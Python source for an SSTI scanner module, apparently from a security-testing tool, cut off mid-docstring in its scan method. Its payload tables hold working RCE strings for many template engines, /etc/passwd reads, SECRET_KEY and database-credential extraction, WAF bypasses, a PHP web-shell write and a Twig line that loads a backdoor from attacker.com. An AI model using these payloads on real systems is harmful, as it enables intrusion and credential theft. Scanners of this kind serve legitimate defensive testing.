"""
Server-Side Template Injection (SSTI) Scanner - ENTERPRISE EDITION v2.0

Enterprise-grade template injection vulnerability scanner with comprehensive
coverage for modern template engines and advanced bypass techniques.

Features:
- Multi-engine detection (15+ template engines)
- Polyglot payloads for blind detection
- WAF/Filter bypass techniques
- Sandbox escape methods
- RCE confirmation testing
- Context-aware payload generation
- Error-based engine fingerprinting
- Encoding bypass (URL, Unicode, HTML entities)
- Nested template injection
- Time-based blind SSTI detection

Supported Template Engines:
- Jinja2 (Python/Flask) - Full RCE chain
- Twig (PHP/Symfony) - Filter exploitation
- Freemarker (Java) - Built-in execution
- Velocity (Java) - ClassTool exploitation
- Smarty (PHP) - Static method calls
- Thymeleaf (Java) - SpEL injection
- ERB (Ruby/Rails) - System calls
- Mako (Python) - Module traversal
- Tornado (Python) - Handler settings
- EJS (Node.js) - Global process access
- Pebble (Java) - Type reflection
- Handlebars (JavaScript) - Prototype pollution
- Nunjucks (JavaScript) - Range exploitation
- Dust.js (JavaScript) - Helper exploitation
- Pug/Jade (JavaScript) - Code blocks

CWE Coverage:
- CWE-94: Improper Control of Generation of Code ('Code Injection')
- CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code
- CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine

Author: PetNTester AI Enterprise
Version: 2.0.0-enterprise
"""

from __future__ import annotations

import asyncio
import re
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import TYPE_CHECKING, Any, Optional
from urllib.parse import urljoin, quote, urlencode, parse_qs, urlparse

import httpx

from scanning.findings import Finding, VulnType, VulnCategory, Severity
from scanning.vuln_scanner import ScanModule
from scanning.scan_context import ScanContext
from utils.logger import get_logger
from utils.scan_client import get_scan_client
from utils.network_utils import resolve_base_url
from utils.rate_limiter import RateLimiter

if TYPE_CHECKING:
    from core.config_manager import Settings

logger = get_logger(__name__)


# ============================================================================
# STATIC ASSET FILTERING - Prevent false positives on non-dynamic content
# ============================================================================

# File extensions that are ALWAYS static (never have SSTI vulnerabilities)
STATIC_ASSET_EXTENSIONS = {
    # Images
    '.jpg', '.jpeg', '.png', '.gif', '.svg', '.ico', '.webp', '.bmp', '.tiff', '.avif',
    # Stylesheets
    '.css', '.scss', '.sass', '.less',
    # Scripts (client-side only)
    '.js', '.mjs', '.ts', '.jsx', '.tsx',
    # Fonts
    '.woff', '.woff2', '.ttf', '.otf', '.eot',
    # Documents
    '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    # Media
    '.mp3', '.mp4', '.wav', '.ogg', '.webm', '.avi', '.mov',
    # Archives
    '.zip', '.tar', '.gz', '.rar', '.7z',
    # Data files
    '.xml', '.json', '.yaml', '.yml', '.csv',
    # Maps
    '.map',
}

# URL path patterns that indicate static assets
STATIC_ASSET_PATTERNS = [
    r'/static/',
    r'/assets/',
    r'/images/',
    r'/img/',
    r'/css/',
    r'/js/',
    r'/fonts/',
    r'/media/',
    r'/uploads/',  # Usually static uploaded files
    r'/dist/',
    r'/build/',
    r'/vendor/',
    r'/node_modules/',
    r'/public/',
    r'/_next/static/',  # Next.js
    r'/__webpack/',  # Webpack
    r'/bundle\.',
    r'/chunk\.',
]


def is_static_asset_url(url: str) -> bool:
    """
    Check if a URL points to a static asset that cannot have SSTI.

    Args:
        url: The URL to check

    Returns:
        True if the URL is a static asset (should skip testing)
    """
    url_lower = url.lower()

    # Check file extension
    for ext in STATIC_ASSET_EXTENSIONS:
        if url_lower.endswith(ext):
            return True
        # Also check for query strings after extension
        if f"{ext}?" in url_lower or f"{ext}#" in url_lower:
            return True

    # Check path patterns
    for pattern in STATIC_ASSET_PATTERNS:
        if re.search(pattern, url_lower, re.IGNORECASE):
            return True

    return False


# ============================================================================
# ENTERPRISE DATA STRUCTURES
# ============================================================================

class TemplateEngine(Enum):
    """Supported template engines."""
    JINJA2 = auto()      # Python (Flask, Django)
    TWIG = auto()        # PHP (Symfony)
    FREEMARKER = auto()  # Java
    VELOCITY = auto()    # Java
    SMARTY = auto()      # PHP
    THYMELEAF = auto()   # Java (Spring)
    ERB = auto()         # Ruby (Rails)
    MAKO = auto()        # Python
    TORNADO = auto()     # Python
    EJS = auto()         # Node.js
    PEBBLE = auto()      # Java
    HANDLEBARS = auto()  # JavaScript
    NUNJUCKS = auto()    # JavaScript
    DUST = auto()        # JavaScript
    PUG = auto()         # JavaScript (formerly Jade)
    UNKNOWN = auto()


class SSTIVulnType(Enum):
    """Types of SSTI vulnerabilities."""
    EXPRESSION_EVALUATION = auto()  # Basic math/string evaluation
    OBJECT_ACCESS = auto()          # Access to objects/config
    FILE_READ = auto()              # Arbitrary file read
    REMOTE_CODE_EXEC = auto()       # Full RCE
    INFORMATION_DISCLOSURE = auto() # Sensitive info leak
    SANDBOX_ESCAPE = auto()         # Breaking out of sandbox
    BLIND_SSTI = auto()             # Time-based/OOB detection


@dataclass
class SSTITestResult:
    """Result of an SSTI test."""
    vulnerable: bool
    engine: Optional[TemplateEngine] = None
    vuln_type: Optional[SSTIVulnType] = None
    confidence: float = 0.0
    payload: str = ""
    evidence: list[str] = field(default_factory=list)
    response_indicator: str = ""


@dataclass
class EngineSignature:
    """Signature for identifying template engines."""
    engine: TemplateEngine
    keywords: list[str]
    error_patterns: list[str]
    behavior_tests: dict[str, str]  # payload -> expected result


# ============================================================================
# ENTERPRISE PAYLOADS - Comprehensive Template Engine Coverage
# ============================================================================

# Polyglot detection payloads - work across multiple engines
# IMPORTANT: Use unique multiplication results that WON'T naturally appear in pages
# 1337*997 = 1333189 (very unlikely to appear naturally)
# 7*191711 = 1341977 (backup unique value)
POLYGLOT_DETECTION_PAYLOADS = [
    # Universal math evaluation - using UNIQUE numbers to prevent false positives
    {"payload": "{{1337*997}}", "expected": "1333189", "engines": ["jinja2", "twig", "nunjucks", "handlebars"]},
    {"payload": "${1337*997}", "expected": "1333189", "engines": ["freemarker", "velocity", "mako", "thymeleaf"]},
    {"payload": "#{1337*997}", "expected": "1333189", "engines": ["pug", "thymeleaf", "erb"]},
    {"payload": "<%= 1337*997 %>", "expected": "1333189", "engines": ["erb", "ejs"]},
    {"payload": "${{1337*997}}", "expected": "1333189", "engines": ["thymeleaf"]},
    {"payload": "{1337*997}", "expected": "1333189", "engines": ["smarty"]},
    {"payload": "{{=1337*997}}", "expected": "1333189", "engines": ["nunjucks"]},
    {"payload": "<%=1337*997%>", "expected": "1333189", "engines": ["ejs", "erb"]},

    # String multiplication (engine fingerprinting) - already unique
    {"payload": "{{7*'7'}}", "expected": "7777777", "engines": ["jinja2"]},
    {"payload": "{{7*'phantomtest'}}", "expected": "phantomtestphantomtestphantomtestphantomtestphantomtestphantomtestphantomtest", "engines": ["jinja2"]},

    # Concatenation tests - using unique strings
    {"payload": "{{'phantom'+'ssti'}}", "expected": "phantomssti", "engines": ["jinja2", "nunjucks"]},
    {"payload": "${\"phantom\"+\"ssti\"}", "expected": "phantomssti", "engines": ["freemarker"]},
]

# Engine-specific detection payloads with unique signatures
ENGINE_SPECIFIC_DETECTION = {
    TemplateEngine.JINJA2: {
        "payloads": [
            {"payload": "{{config}}", "expected": "Config", "unique": True},
            {"payload": "{{self}}", "expected": "TemplateReference", "unique": True},
            {"payload": "{{request}}", "expected": "Request", "unique": False},
            {"payload": "{{lipsum}}", "expected": "function", "unique": True},
            {"payload": "{{cycler}}", "expected": "cycler", "unique": True},
            {"payload": "{{joiner}}", "expected": "joiner", "unique": True},
            {"payload": "{{namespace}}", "expected": "Namespace", "unique": True},
            {"payload": "{{range(5)}}", "expected": "range", "unique": False},
        ],
        "error_signatures": [
            "jinja2.exceptions",
            "UndefinedError",
            "TemplateNotFound",
            "TemplateSyntaxError",
        ],
    },
    TemplateEngine.TWIG: {
        "payloads": [
            {"payload": "{{_self}}", "expected": "__TwigTemplate", "unique": True},
            {"payload": "{{_context}}", "expected": "Array", "unique": False},
            {"payload": "{{app}}", "expected": "Symfony", "unique": True},
            {"payload": "{{'foo'|upper}}", "expected": "FOO", "unique": False},
            {"payload": "{{dump()}}", "expected": "null", "unique": True},
        ],
        "error_signatures": [
            "Twig_Error",
            "Twig\\Error",
            "TwigException",
            "Unknown filter",
        ],
    },
    TemplateEngine.FREEMARKER: {
        "payloads": [
            {"payload": "${.version}", "expected": "2.", "unique": True},
            {"payload": "${.now}", "expected": "202", "unique": False},
            {"payload": "<#assign x=1>${x}", "expected": "1", "unique": True},
            {"payload": "${\"test\"?upper_case}", "expected": "TEST", "unique": True},
        ],
        "error_signatures": [
            "freemarker.core",
            "FreeMarker",
            "FTL stack trace",
            "ParseException",
        ],
    },
    TemplateEngine.VELOCITY: {
        "payloads": [
            {"payload": "#set($x=1337*997)$x", "expected": "1333189", "unique": True},
            {"payload": "$class", "expected": "class", "unique": True},
            {"payload": "#if(true)yes#end", "expected": "yes", "unique": True},
        ],
        "error_signatures": [
            "VelocityException",
            "org.apache.velocity",
            "ParseErrorException",
        ],
    },
    TemplateEngine.SMARTY: {
        "payloads": [
            {"payload": "{$smarty.version}", "expected": ".", "unique": True},
            {"payload": "{$smarty.now}", "expected": "", "unique": False},
            {"payload": "{math equation=\"1337*997\"}", "expected": "1333189", "unique": True},
            {"payload": "{'test'|upper}", "expected": "TEST", "unique": False},
        ],
        "error_signatures": [
            "Smarty error",
            "SmartyException",
            "Smarty_Internal",
        ],
    },
    TemplateEngine.THYMELEAF: {
        "payloads": [
            {"payload": "[[${1337*997}]]", "expected": "1333189", "unique": True},
            {"payload": "[(${1337*997})]", "expected": "1333189", "unique": True},
            {"payload": "__${1337*997}__", "expected": "1333189", "unique": True},
        ],
        "error_signatures": [
            "org.thymeleaf",
            "TemplateProcessingException",
            "SpelEvaluationException",
        ],
    },
    TemplateEngine.ERB: {
        "payloads": [
            {"payload": "<%= 1337*997 %>", "expected": "1333189", "unique": True},
            {"payload": "<%= self.class %>", "expected": "Binding", "unique": True},
            {"payload": "<%= Rails.version %>", "expected": ".", "unique": True},
        ],
        "error_signatures": [
            "ActionView",
            "ERB::Util",
            "SyntaxError",
            "Rails",
        ],
    },
    TemplateEngine.MAKO: {
        "payloads": [
            {"payload": "${1337*997}", "expected": "1333189", "unique": True},
            {"payload": "<%1337*997%>", "expected": "1333189", "unique": True},
            {"payload": "${self}", "expected": "Context", "unique": True},
        ],
        "error_signatures": [
            "mako.exceptions",
            "MakoException",
            "CompileException",
        ],
    },
    TemplateEngine.EJS: {
        "payloads": [
            {"payload": "<%= 1337*997 %>", "expected": "1333189", "unique": True},
            {"payload": "<%- 1337*997 %>", "expected": "1333189", "unique": True},
            {"payload": "<%= global %>", "expected": "object", "unique": True},
            {"payload": "<%= process.version %>", "expected": "v", "unique": True},
        ],
        "error_signatures": [
            "EJS",
            "ReferenceError",
            "ejs.js",
        ],
    },
    TemplateEngine.PEBBLE: {
        "payloads": [
            {"payload": "{{1337*997}}", "expected": "1333189", "unique": True},
            {"payload": "{% set x = 1337*997 %}{{x}}", "expected": "1333189", "unique": True},
        ],
        "error_signatures": [
            "PebbleException",
            "com.mitchellbosecke.pebble",
        ],
    },
    TemplateEngine.NUNJUCKS: {
        "payloads": [
            {"payload": "{{1337*997}}", "expected": "1333189", "unique": True},
            {"payload": "{{range(5)}}", "expected": "[object", "unique": True},
            {"payload": "{{constructor}}", "expected": "function", "unique": False},
        ],
        "error_signatures": [
            "nunjucks",
            "Template render error",
        ],
    },
    TemplateEngine.HANDLEBARS: {
        "payloads": [
            {"payload": "{{this}}", "expected": "", "unique": False},
            {"payload": "{{constructor.constructor}}", "expected": "function", "unique": False},
        ],
        "error_signatures": [
            "Handlebars",
            "Parse error",
        ],
    },
}

# RCE payloads by engine (comprehensive)
RCE_PAYLOADS = {
    TemplateEngine.JINJA2: [
        # Object traversal methods
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{''.__class__.__base__.__subclasses__()}}",
        "{{().__class__.__bases__[0].__subclasses__()}}",
        # Config/globals access
        "{{config.items()}}",
        "{{self.__init__.__globals__}}",
        "{{self._TemplateReference__context}}",
        # Subprocess/os access
        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{lipsum.__globals__.os.popen('id').read()}}",
        # Request object exploitation
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{request.__class__._get_current_object().__class__.__mro__[1].__subclasses__()}}",
        # Namespace exploitation
        "{{namespace.__init__.__globals__.os.popen('id').read()}}",
        # URL_for exploitation (Flask)
        "{{url_for.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{url_for.__globals__.os.popen('id').read()}}",
        # Get_flashed_messages (Flask)
        "{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        # Dict bypass techniques
        "{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].popen('id').read()}}",
        # Jinja2 3.x specific
        "{{self.__init__.__globals__.__builtins__['__import__']('os').popen('id').read()}}",
    ],
    TemplateEngine.TWIG: [
        # Filter exploitation
        "{{'/etc/passwd'|file_excerpt(1,30)}}",
        "{{app.request.server.all|join(',')}}",
        "{{_self.env.display('')}}{{system('id')}}",
        # Object instantiation
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
        # Twig 1.x
        "{{_self.env.setCache('ftp://attacker.com')}}{{_self.env.loadTemplate('backdoor')}}",
        # Attribute access
        "{{['id']|filter('system')}}",
        "{{['id']|map('system')|join}}",
        "{{['id','whoami']|filter('exec')}}",
        # Sort callback
        "{{['id',1]|sort('system')}}",
        # Array map
        "{{'id'|filter('passthru')}}",
    ],
    TemplateEngine.FREEMARKER: [
        # Built-in execution
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        # ObjectConstructor
        "${\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.ProcessBuilder\",\"id\").start()}",
        # JythonRuntime
        "<#assign ob=\"freemarker.template.utility.ObjectConstructor\"?new()><#assign br=ob(\"java.io.BufferedReader\",ob(\"java.io.InputStreamReader\",ob(\"java.lang.ProcessBuilder\",\"id\").start().getInputStream()))>${br.readLine()}",
        # API access
        "<#assign uri=object.class.getResource(\"/\").toURI()><#assign input=uri.create(\"file:///etc/passwd\").toURL().openConnection()><#assign is=input.getInputStream()><#assign br=object.class.forName(\"java.io.BufferedReader\").getConstructor(object.class.forName(\"java.io.Reader\")).newInstance(object.class.forName(\"java.io.InputStreamReader\").getConstructor(object.class.forName(\"java.io.InputStream\")).newInstance(is))>${br.readLine()}",
    ],
    TemplateEngine.VELOCITY: [
        # Runtime execution
        "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))##\n#set($chr=$x.class.forName('java.lang.Character'))##\n#set($str=$x.class.forName('java.lang.String'))##\n#set($ex=$rt.getRuntime().exec('id'))##\n$ex.waitFor()\n#set($out=$ex.getInputStream())##\n#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
        # ClassTool
        "$class.inspect('java.lang.Runtime').type.getRuntime().exec('id').waitFor()",
        # Simple version
        "#set($e='e')$e.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')",
    ],
    TemplateEngine.SMARTY: [
        # PHP code execution
        "{php}system('id');{/php}",
        "{php}passthru('id');{/php}",
        # Static class method
        "{self::getStreamVariable(\"file:///etc/passwd\")}",
        # Smarty tags bypass
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
        # If tag exploitation
        "{if system('id')}{/if}",
        "{if passthru('id')}{/if}",
    ],
    TemplateEngine.THYMELEAF: [
        # SpEL injection
        "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
        "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__::.x",
        # URL-based
        "__${#rt = @java.lang.Runtime@getRuntime(),#rt.exec('id')}__::.x",
        # Alternative syntax
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "*{T(java.lang.Runtime).getRuntime().exec('id')}",
        # Spring beans
        "${#ctx.getEnvironment().getProperty('spring.datasource.password')}",
    ],
    TemplateEngine.ERB: [
        "<%= system('id') %>",
        "<%= `id` %>",
        "<%= exec('id') %>",
        "<%= IO.popen('id').readlines() %>",
        "<%= require 'open3'; Open3.capture3('id') %>",
        "<%= %x(id) %>",
        "<%= Kernel.system('id') %>",
        "<%= File.read('/etc/passwd') %>",
    ],
    TemplateEngine.MAKO: [
        "${self.module.cache.util.os.system('id')}",
        "<%\nimport os\nx=os.popen('id').read()\n%>\n${x}",
        "${self.module.cache.util.os.popen('id').read()}",
        "<%import os%>${os.popen('id').read()}",
        "<%\nimport subprocess\nprint(subprocess.check_output('id',shell=True))\n%>",
    ],
    TemplateEngine.TORNADO: [
        "{{handler.settings}}",
        "{%import os%}{{os.popen('id').read()}}",
        "{{handler.application.settings}}",
        "{%import subprocess%}{{subprocess.check_output('id',shell=True)}}",
    ],
    TemplateEngine.EJS: [
        "<%= global.process.mainModule.require('child_process').execSync('id') %>",
        "<%= global.process.mainModule.require('child_process').spawnSync('id').stdout %>",
        "<%= require('child_process').execSync('id') %>",
        "<%- global.process.mainModule.require('child_process').execSync('id') %>",
    ],
    TemplateEngine.PEBBLE: [
        "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}",
        "{% set cmd = 'id' %}{{ (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) }}",
    ],
    TemplateEngine.NUNJUCKS: [
        "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
        "{{constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
    ],
    TemplateEngine.HANDLEBARS: [
        "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
    ],
}

# WAF/Filter bypass payloads
WAF_BYPASS_PAYLOADS = [
    # URL encoding
    {"original": "{{7*7}}", "bypass": "%7b%7b7*7%7d%7d", "type": "url_encode"},
    {"original": "{{config}}", "bypass": "%7b%7bconfig%7d%7d", "type": "url_encode"},
    
    # Double URL encoding
    {"original": "{{7*7}}", "bypass": "%257b%257b7*7%257d%257d", "type": "double_url"},
    
    # Unicode encoding
    {"original": "{{7*7}}", "bypass": "\u007b\u007b7*7\u007d\u007d", "type": "unicode"},
    
    # HTML entities
    {"original": "{{7*7}}", "bypass": "&#123;&#123;7*7&#125;&#125;", "type": "html_entity"},
    {"original": "{{7*7}}", "bypass": "&#x7b;&#x7b;7*7&#x7d;&#x7d;", "type": "html_hex"},
    
    # Whitespace bypass
    {"original": "{{7*7}}", "bypass": "{{ 7*7 }}", "type": "whitespace"},
    {"original": "{{7*7}}", "bypass": "{{  7 * 7  }}", "type": "whitespace"},
    {"original": "{{7*7}}", "bypass": "{{\t7*7\t}}", "type": "tab"},
    {"original": "{{7*7}}", "bypass": "{{\n7*7\n}}", "type": "newline"},
    
    # Comment injection (Jinja2)
    {"original": "{{7*7}}", "bypass": "{{7{#comment#}*7}}", "type": "comment"},
    
    # String concatenation bypass
    {"original": "{{config}}", "bypass": "{{\"con\"+\"fig\"}}", "type": "concat"},
    {"original": "{{config}}", "bypass": "{{'con'~'fig'}}", "type": "tilde_concat"},
    
    # Filter chaining bypass
    {"original": "{{config}}", "bypass": "{{config|safe}}", "type": "filter"},
    {"original": "{{7*7}}", "bypass": "{{(7*7)|safe}}", "type": "filter"},
    
    # Variable indirection
    {"original": "{{config}}", "bypass": "{{self.__dict__['config']}}", "type": "dict_access"},
    
    # Alternative delimiters (if configurable)
    {"original": "{{7*7}}", "bypass": "{%print 7*7%}", "type": "print_tag"},
    {"original": "{{config}}", "bypass": "{%print config%}", "type": "print_tag"},
]

# Blind SSTI detection payloads (time-based)
BLIND_SSTI_PAYLOADS = [
    # Jinja2 time delay
    {"payload": "{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('time')|attr('sleep')(5)}}", "engine": "jinja2", "delay": 5},
    
    # Ruby sleep
    {"payload": "<%= sleep(5) %>", "engine": "erb", "delay": 5},
    
    # Java Thread.sleep
    {"payload": "${T(java.lang.Thread).sleep(5000)}", "engine": "thymeleaf", "delay": 5},
    
    # Python time.sleep
    {"payload": "<%import time;time.sleep(5)%>", "engine": "mako", "delay": 5},
    
    # Node.js
    {"payload": "<%require('child_process').execSync('sleep 5')%>", "engine": "ejs", "delay": 5},
]

# Information disclosure payloads
INFO_DISCLOSURE_PAYLOADS = [
    # Environment/Config
    {"payload": "{{config}}", "type": "config", "engine": "jinja2"},
    {"payload": "{{settings}}", "type": "settings", "engine": "generic"},
    {"payload": "{{request.environ}}", "type": "environ", "engine": "jinja2"},
    {"payload": "{{handler.settings}}", "type": "settings", "engine": "tornado"},
    {"payload": "{{app.request.server.all}}", "type": "server", "engine": "twig"},
    
    # Database credentials
    {"payload": "{{config.SQLALCHEMY_DATABASE_URI}}", "type": "db_creds", "engine": "jinja2"},
    {"payload": "${spring.datasource.url}", "type": "db_creds", "engine": "thymeleaf"},
    
    # Secret keys
    {"payload": "{{config.SECRET_KEY}}", "type": "secret", "engine": "jinja2"},
    {"payload": "{{settings.SECRET_KEY}}", "type": "secret", "engine": "django"},
    
    # File read
    {"payload": "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}", "type": "file_read", "engine": "jinja2"},
    {"payload": "<%= File.read('/etc/passwd') %>", "type": "file_read", "engine": "erb"},
]


class SSTIScanner(ScanModule):
    """
    Server-Side Template Injection Scanner - ENTERPRISE EDITION v2.0
    
    Comprehensive SSTI vulnerability testing including:
    - Multi-engine detection (15+ template engines)
    - Polyglot payloads for broad coverage
    - WAF/Filter bypass techniques
    - Sandbox escape methods
    - Context-aware RCE confirmation
    - Blind SSTI detection (time-based)
    - Error-based engine fingerprinting
    - Information disclosure testing
    
    CWE Coverage: CWE-94, CWE-95, CWE-1336
    """
    
    name = "ssti_scanner"
    version = "2.0-enterprise"
    
    # Template engine detection payloads with expected results
    # IMPORTANT: Use unique numbers (1337*997=1333189) to prevent false positives
    DETECTION_PAYLOADS = {
        # Universal math payload - works in most engines (UNIQUE numbers)
        "{{1337*997}}": "1333189",
        "${1337*997}": "1333189",
        "#{1337*997}": "1333189",
        "<%= 1337*997 %>": "1333189",
        "${{1337*997}}": "1333189",
        "{{= 1337*997}}": "1333189",
        "{1337*997}": "1333189",

        # Jinja2/Twig specific - string multiplication is already unique
        "{{7*'7'}}": "7777777",
        "{{config}}": "Config",

        # Freemarker
        "<#assign x=1337*997>${x}": "1333189",

        # Velocity
        "#set($x=1337*997)$x": "1333189",
        "$class.inspect": "class",

        # Smarty
        "{php}echo 1337*997;{/php}": "1333189",
        "{math equation=\"1337*997\"}": "1333189",

        # Thymeleaf
        "[[${1337*997}]]": "1333189",

        # ERB (Ruby)
        "<%= system('id') %>": "uid=",

        # Mako
        "<%1337*997%>": "1333189",

        # Pug/Jade - already uses unique patterns
    }
    
    # Engine-specific RCE payloads (kept for backward compatibility)
    RCE_PAYLOADS = {
        "jinja2": RCE_PAYLOADS[TemplateEngine.JINJA2],
        "twig": RCE_PAYLOADS[TemplateEngine.TWIG],
        "freemarker": RCE_PAYLOADS[TemplateEngine.FREEMARKER],
        "velocity": RCE_PAYLOADS[TemplateEngine.VELOCITY],
        "smarty": RCE_PAYLOADS[TemplateEngine.SMARTY],
        "thymeleaf": RCE_PAYLOADS[TemplateEngine.THYMELEAF],
        "erb": RCE_PAYLOADS[TemplateEngine.ERB],
        "mako": RCE_PAYLOADS[TemplateEngine.MAKO],
        "tornado": RCE_PAYLOADS[TemplateEngine.TORNADO],
        "ejs": RCE_PAYLOADS[TemplateEngine.EJS],
        "pebble": RCE_PAYLOADS[TemplateEngine.PEBBLE],
    }
    
    # Engine identification signatures
    ENGINE_SIGNATURES = {
        "jinja2": ["jinja2", "flask", "werkzeug", "TemplateNotFound"],
        "twig": ["twig", "symfony", "Twig_Error"],
        "freemarker": ["freemarker", "FreeMarker", "FTL stack trace"],
        "velocity": ["velocity", "VelocityException", "org.apache.velocity"],
        "smarty": ["smarty", "Smarty error"],
        "thymeleaf": ["thymeleaf", "org.thymeleaf"],
        "erb": ["erb", "ActionView", "Rails"],
        "mako": ["mako", "MakoException"],
        "tornado": ["tornado"],
        "ejs": ["ejs"],
        "pebble": ["pebble", "PebbleException"],
    }
    
    # G-09 FIX: Priority payloads for fast template engine fingerprinting
    FINGERPRINT_PAYLOADS = [
        # Ultra-fast math payloads - test ONE from each engine family
        ("{{1337*997}}", "1333189", ["jinja2", "twig", "nunjucks", "pebble"]),
        ("${1337*997}", "1333189", ["freemarker", "velocity", "mako", "thymeleaf"]),
        ("<%= 1337*997 %>", "1333189", ["erb", "ejs"]),
        ("{math equation=\"1337*997\"}", "1333189", ["smarty"]),
        # String multiplication for Jinja2 confirmation
        ("{{7*'7'}}", "7777777", ["jinja2"]),
    ]

    # G-09 FIX: Known SSTI-vulnerable endpoints for proactive discovery
    KNOWN_SSTI_PATHS = [
        # bWAPP SSTI
        "/bWAPP/ssti.php",
        "/ssti.php",
        # Flask/Jinja2 common patterns
        "/render",
        "/template",
        "/preview",
        "/api/render",
        "/api/template",
        # Generic
        "/page",
        "/view",
        "/display",
    ]

    def __init__(
        self,
        settings: Settings,
        *,
        findings_store: Any = None,
        rate_limiter: Any = None,
    ) -> None:
        super().__init__(settings, findings_store=findings_store, rate_limiter=rate_limiter)
        self.timeout = settings.timeouts.request_timeout if hasattr(settings, 'timeouts') else 30.0
        # Track partial findings for timeout recovery
        self._partial_findings: list[dict[str, Any]] = []

        # G-09 FIX: Overall scan timeout (was defined but never used!)
        self.MAX_SCAN_DURATION = 120.0  # 2 minutes max for entire module
        self._scan_start_time: float = 0.0

        # TIMEOUT-FIX 2026-02-12: Per-endpoint timeout and early exit
        self.endpoint_timeout = 30.0       # Max 30s per endpoint (SSTI tests are relatively fast)
        self._endpoints_without_findings: int = 0
        self._max_no_progress_endpoints = 20  # Reduce thoroughness after 20 endpoints with no findings

        # G-09 FIX: Detected template engine (set during fingerprinting)
        self._detected_engine: Optional[TemplateEngine] = None
    
    def get_partial_findings(self) -> list[dict[str, Any]]:
        """Return partial findings collected so far (for timeout recovery)."""
        return self._partial_findings.copy()

    async def _discover_ssti_endpoints(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[str]:
        """G-09 FIX: Proactively discover SSTI-vulnerable endpoints."""
        discovered = []

        for path in self.KNOWN_SSTI_PATHS:
            await rate_limiter.acquire()
            url = urljoin(base_url, path)

            try:
                response = await client.get(url, follow_redirects=True)
                if response.status_code != 404 and len(response.text) > 100:
                    # Check for template indicators
                    text_lower = response.text.lower()
                    ssti_indicators = [
                        "template", "render", "jinja", "twig", "freemarker",
                        "{{", "${", "<%", "name=", "content=", "message=",
                    ]
                    if any(ind in text_lower for ind in ssti_indicators):
                        discovered.append(url)
                        logger.debug(f"[SSTI] Discovered endpoint: {url}")
            except Exception:
                pass

        return discovered

    async def _fingerprint_template_engine(
        self,
        client: httpx.AsyncClient,
        urls: list[str],
        rate_limiter: RateLimiter,
    ) -> Optional[TemplateEngine]:
        """
        G-09 FIX: Quick fingerprinting to detect template engine BEFORE full testing.

        Tests priority payloads on a few endpoints to identify the engine early.
        This allows focused testing with engine-specific payloads.
        """
        engine_hits: dict[str, int] = {}
        test_params = ["name", "template", "page", "test", "q"]

        for url in urls[:3]:  # Only test first 3 URLs for fingerprinting
            for param in test_params[:2]:  # Only test 2 params per URL
                for payload, expected, engines in self.FINGERPRINT_PAYLOADS:
                    await rate_limiter.acquire()

                    try:
                        test_url = self._build_test_url(url, param, payload)
                        response = await client.get(test_url)

                        if expected in response.text and payload not in response.text:
                            # Template evaluation detected!
                            for engine in engines:
                                engine_hits[engine] = engine_hits.get(engine, 0) + 1
                            logger.debug(f"[SSTI] Fingerprint hit: {engines} via {payload}")

                    except Exception:
                        pass

        # Return the most likely engine
        if engine_hits:
            best_engine = max(engine_hits, key=engine_hits.get)
            engine_map = {
                "jinja2": TemplateEngine.JINJA2,
                "twig": TemplateEngine.TWIG,
                "freemarker": TemplateEngine.FREEMARKER,
                "velocity": TemplateEngine.VELOCITY,
                "mako": TemplateEngine.MAKO,
                "thymeleaf": TemplateEngine.THYMELEAF,
                "erb": TemplateEngine.ERB,
                "ejs": TemplateEngine.EJS,
                "smarty": TemplateEngine.SMARTY,
                "nunjucks": TemplateEngine.NUNJUCKS,
                "pebble": TemplateEngine.PEBBLE,
            }
            return engine_map.get(best_engine)

        return None
    
    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> dict[str, Any]:
        """
        Enterprise: Comprehensive SSTI vulnerability scan.

        G-09 FIX: Uses fingerprinting-first approach:
